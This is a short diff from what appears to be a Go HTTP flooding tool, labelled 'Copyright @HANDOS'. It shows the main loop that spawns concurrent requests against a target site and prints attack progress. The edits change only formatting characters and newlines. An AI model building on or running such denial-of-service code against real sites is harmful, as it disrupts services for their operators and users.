@@ -9147,7 +9147,7 @@ func main() {
 	}
 
 	go func() {
-		fmt.Println("▶ Copyright @HANDOS - Start the attack.... \n\n\n\n")
+		fmt.Println("▶ Copyright @HANDOS - Start the attack.... \n\n\n")
 		ss := make(chan uint8, 8)
 		var (
 			err, sent int32
@@ -9158,7 +9158,7 @@ func main() {
 				go httpcall(site, u.Host, data, headers, ss)
 			}
 			if sent%10 == 0 {
-				fmt.Printf("\r%6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
+				fmt.Printf("\r%6d of max %-6d ║\t%7d ║\t%6d", cur, maxproc, sent, err)
 			}
 			switch <-ss {
 			case callExitOnErr:
@@ -9171,7 +9171,7 @@ func main() {
 				sent++
 			case targetComplete:
 				sent++
-				fmt.Printf("\r%-6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
+				fmt.Printf("\r%-6d of max %-6d ║\t%7d ║\t%6d", cur, maxproc, sent, err)
 				fmt.Println("\r-- LMT Attack Finished --       \n\n\r")
 				os.Exit(0)
 			}
